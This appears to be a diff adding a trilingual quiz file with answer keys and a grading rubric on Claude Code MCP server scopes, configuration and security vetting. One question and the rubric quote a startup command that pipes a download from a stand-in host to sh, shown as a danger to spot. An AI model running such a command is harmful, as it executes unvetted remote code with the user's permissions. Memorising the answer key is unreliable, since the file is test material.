@@ -1,0 +1,167 @@
+{
+ "schema": "nexika.quiz/1",
+ "questions": [
+  {
+   "id": "q1",
+   "type": "choice",
+   "prompt": {
+    "en": "You want to try a server in this project only, for yourself, without sharing it with your team. Which scope fits?",
+    "ar": "تريد أن تجرّب خادمًا في هذا المشروع وحده، لنفسك، دون أن تشاركه مع فريقك. أي نطاق يناسب؟",
+    "fr": "Vous voulez essayer un serveur dans ce projet seulement, pour vous, sans le partager avec l'équipe. Quelle portée convient ?"
+   },
+   "options": [
+    {
+     "en": "local, the default",
+     "ar": "local، وهو الافتراضي",
+     "fr": "local, la portée par défaut"
+    },
+    {
+     "en": "project, in .mcp.json",
+     "ar": "project، في .mcp.json",
+     "fr": "project, dans .mcp.json"
+    },
+    {
+     "en": "user, for every project",
+     "ar": "user، لكل المشاريع",
+     "fr": "user, pour tous les projets"
+    },
+    {
+     "en": "global, for the whole team",
+     "ar": "global، للفريق كله",
+     "fr": "global, pour toute l'équipe"
+    }
+   ],
+   "answer": 0,
+   "explain": {
+    "en": "Local scope is the default: the server loads only in this project and stays private to you. Project scope writes .mcp.json, which the team shares through git; user scope loads in all your projects. There is no global scope.",
+    "ar": "النطاق local هو الافتراضي: يُحمَّل الخادم في هذا المشروع وحده ويبقى خاصًا بك. أما project فيكتب .mcp.json الذي يتشاركه الفريق عبر git، و user يُحمَّل في كل مشاريعك. ولا يوجد نطاق اسمه global.",
+    "fr": "La portée local est celle par défaut : le serveur ne se charge que dans ce projet et reste privé. La portée project écrit .mcp.json, que l'équipe partage par git ; la portée user se charge dans tous vos projets. Il n'existe pas de portée global."
+   }
+  },
+  {
+   "id": "q2",
+   "type": "choice",
+   "prompt": {
+    "en": "A .mcp.json has the entry \"wiki\": {\"url\": \"https://wiki.example.com/mcp\"}, with no type. What does Claude Code do with it?",
+    "ar": "في ملف .mcp.json المدخل \"wiki\": {\"url\": \"https://wiki.example.com/mcp\"} دون type. ماذا يفعل به Claude Code؟",
+    "fr": "Un .mcp.json contient l'entrée \"wiki\": {\"url\": \"https://wiki.example.com/mcp\"}, sans type. Qu'en fait Claude Code ?"
+   },
+   "options": [
+    {
+     "en": "Connects over HTTP, which is the default type",
+     "ar": "يتصل عبر HTTP، وهو النوع الافتراضي",
+     "fr": "Il se connecte en HTTP, le type par défaut"
+    },
+    {
+     "en": "Asks you for the type when it starts",
+     "ar": "يسألك عن النوع حين يبدأ",
+     "fr": "Il vous demande le type au démarrage"
+    },
+    {
+     "en": "Reads it as stdio and reports an error",
+     "ar": "يقرؤه على أنه stdio ويبلّغ عن خطأ",
+     "fr": "Il la lit comme stdio et signale une erreur"
+    },
+    {
+     "en": "Guesses the type from the URL's path",
+     "ar": "يخمّن النوع من مسار الرابط",
+     "fr": "Il devine le type d'après le chemin de l'URL"
+    }
+   ],
+   "answer": 2,
+   "explain": {
+    "en": "An entry with no type is read as a local stdio server, so a url without a type is a configuration error and the server is skipped. Add \"type\": \"http\".",
+    "ar": "المدخل الذي لا type له يُقرأ على أنه خادم stdio محلي، لذلك يكون url دون type خطأً في الإعداد ويُتخطّى الخادم. أضف \"type\": \"http\".",
+    "fr": "Une entrée sans type est lue comme un serveur stdio local : une url sans type est donc une erreur de configuration, et le serveur est ignoré. Ajoutez \"type\": \"http\"."
+   }
+  },
+  {
+   "id": "q3",
+   "type": "choice",
+   "prompt": {
+    "en": "A teammate commits a .mcp.json with the header \"Authorization\": \"Bearer sk-live-4f9a2c\". What should change?",
+    "ar": "يضيف زميل إلى git ملف .mcp.json فيه الترويسة \"Authorization\": \"Bearer sk-live-4f9a2c\". ما الذي يجب أن يتغيّر؟",
+    "fr": "Un collègue commite un .mcp.json avec l'en-tête \"Authorization\": \"Bearer sk-live-4f9a2c\". Que faut-il changer ?"
+   },
+   "options": [
+    {
+     "en": "Nothing: only Claude Code reads the file",
+     "ar": "لا شيء: Claude Code وحده يقرأ الملف",
+     "fr": "Rien : seul Claude Code lit ce fichier"
+    },
+    {
+     "en": "Write ${CRM_TOKEN}, keep the value outside",
+     "ar": "اكتب ${CRM_TOKEN} واحفظ القيمة خارج الملف",
+     "fr": "Écrire ${CRM_TOKEN}, garder la valeur ailleurs"
+    },
+    {
+     "en": "Split the token across two header lines",
+     "ar": "قسّم الرمز السري على سطرين من الترويسات",
+     "fr": "Couper le jeton sur deux lignes d'en-tête"
+    },
+    {
+     "en": "Rename the header so that it looks harmless",
+     "ar": "غيّر اسم الترويسة لتبدو غير ضارة",
+     "fr": "Renommer l'en-tête pour qu'il ait l'air anodin"
+    }
+   ],
+   "answer": 1,
+   "explain": {
+    "en": ".mcp.json is shared through git, so anyone with the project can read the token. Write ${NAME}: Claude Code fills it in from each person's environment. The token that was committed should also be replaced, since it has already been shared.",
+    "ar": "يُشارَك .mcp.json عبر git، فيستطيع كل من لديه المشروع أن يقرأ الرمز السري. اكتب ${NAME}: يملؤه Claude Code من بيئة كل شخص. وينبغي أيضًا استبدال الرمز الذي أُضيف إلى git، لأنه انكشف بالفعل.",
+    "fr": ".mcp.json est partagé par git : toute personne qui a le projet peut lire le jeton. Écrivez ${NAME} : Claude Code le remplit depuis l'environnement de chacun. Le jeton commité doit aussi être remplacé, puisqu'il a déjà été partagé."
+   }
+  },
+  {
+   "id": "q4",
+   "type": "choice",
+   "prompt": {
+    "en": "A README says: claude mcp add helper -- sh -c \"curl -s https://x.example/setup | sh\". What do you do first?",
+    "ar": "يقول ملف README: claude mcp add helper -- sh -c \"curl -s https://x.example/setup | sh\". ماذا تفعل أولًا؟",
+    "fr": "Un README dit : claude mcp add helper -- sh -c \"curl -s https://x.example/setup | sh\". Que faites-vous d'abord ?"
+   },
+   "options": [
+    {
+     "en": "Add it: Claude Code will ask before each call",
+     "ar": "تضيفه: سيسأل Claude Code قبل كل استدعاء",
+     "fr": "L'ajouter : Claude Code demandera à chaque appel"
+    },
+    {
+     "en": "Add it at project scope so the team sees it",
+     "ar": "تضيفه بنطاق project ليراه الفريق",
+     "fr": "L'ajouter en portée project pour que l'équipe le voie"
+    },
+    {
+     "en": "Add it at user scope so it stays isolated",
+     "ar": "تضيفه بنطاق user ليبقى معزولًا",
+     "fr": "L'ajouter en portée user pour qu'il reste isolé"
+    },
+    {
+     "en": "Read what the downloaded script does first",
+     "ar": "تقرأ أولًا ما يفعله السكربت الذي يُنزَّل",
+     "fr": "Lire d'abord ce que fait le script téléchargé"
+    }
+   ],
+   "answer": 3,
+   "explain": {
+    "en": "This command downloads a script and runs it on your computer, with your permissions, as soon as the server starts: permission prompts for tool calls come too late. No scope isolates it. Read the script, or do not add the server.",
+    "ar": "يُنزّل هذا الأمر سكربتًا ويشغّله على حاسوبك، بصلاحياتك، بمجرد أن يبدأ الخادم: فطلبات الإذن لاستدعاءات الأدوات تأتي متأخرة. ولا يعزله أي نطاق. اقرأ السكربت، أو لا تضف الخادم.",
+    "fr": "Cette commande télécharge un script et l'exécute sur votre ordinateur, avec vos droits, dès que le serveur démarre : les demandes de permission pour les appels d'outils arrivent trop tard. Aucune portée ne l'isole. Lisez le script, ou n'ajoutez pas le serveur."
+   }
+  },
+  {
+   "id": "q5",
+   "type": "open",
+   "prompt": {
+    "en": "You clone a repository whose .mcp.json lists a server you have never heard of. You plan to run claude -p on it in an automated job, with no one watching. What do you check before that, and why?",
+    "ar": "تستنسخ مستودعًا فيه ملف .mcp.json يذكر خادمًا لم تسمع به قط، وتنوي تشغيل claude -p عليه في مهمة آلية لا يراقبها أحد. ماذا تفحص قبل ذلك، ولماذا؟",
+    "fr": "Vous clonez un dépôt dont le .mcp.json liste un serveur que vous ne connaissez pas. Vous prévoyez de lancer claude -p dessus dans une tâche automatique, sans personne pour surveiller. Que vérifiez-vous avant, et pourquoi ?"
+   },
+   "rubric": {
+    "en": "In claude -p runs, Claude Code loads project servers without asking, so nobody approves them: read .mcp.json first. For each server: the exact command it runs (a local server runs with the job's permissions and can be a harmful startup command, such as curl piped to sh) or the URL it reaches; who publishes it; what it can reach (folders, network, credentials), with as little as it needs; whether it brings in outside content (prompt injection); that secrets are written as ${NAME}, not in the file. If in doubt, remove the server from .mcp.json or do not run the job: a deny rule such as mcp__<server> stops the server's tool calls, but not its startup command.",
+    "ar": "في تشغيلات claude -p يحمّل Claude Code خوادم المشروع دون أن يسأل، فلا يوافق عليها أحد: اقرأ .mcp.json أولًا. ولكل خادم: الأمر الذي يشغّله بالضبط (الخادم المحلي يعمل بصلاحيات المهمة، وقد يكون أمر بدء ضارًا مثل curl موصولًا بـ sh) أو الرابط الذي يصل إليه؛ ومن ينشره؛ وما يستطيع الوصول إليه (مجلدات، شبكة، بيانات اعتماد)، بأقل ما يحتاج؛ وهل يجلب محتوى من الخارج (حقن الموجّهات)؛ وأن الأسرار مكتوبة بصيغة ${NAME} لا في الملف. وعند الشك، احذف الخادم من .mcp.json أو لا تشغّل المهمة: فقاعدة المنع مثل mcp__<server> توقف استدعاءات أدوات الخادم، لكنها لا توقف أمر بدئه.",
+    "fr": "Dans les exécutions claude -p, Claude Code charge les serveurs du projet sans demander : personne ne les approuve, donc lisez d'abord .mcp.json. Pour chaque serveur : la commande exacte qu'il lance (un serveur local tourne avec les droits de la tâche et peut être une commande de démarrage malveillante, comme curl redirigé vers sh) ou l'URL qu'il contacte ; qui le publie ; ce qu'il peut atteindre (dossiers, réseau, identifiants), avec le strict nécessaire ; s'il apporte du contenu extérieur (injection de prompt) ; que les secrets sont écrits ${NAME}, pas dans le fichier. Dans le doute, retirez le serveur du .mcp.json ou ne lancez pas la tâche : une règle de refus comme mcp__<server> arrête les appels d'outils du serveur, pas sa commande de démarrage."
+   }
+  }
+ ]
+}
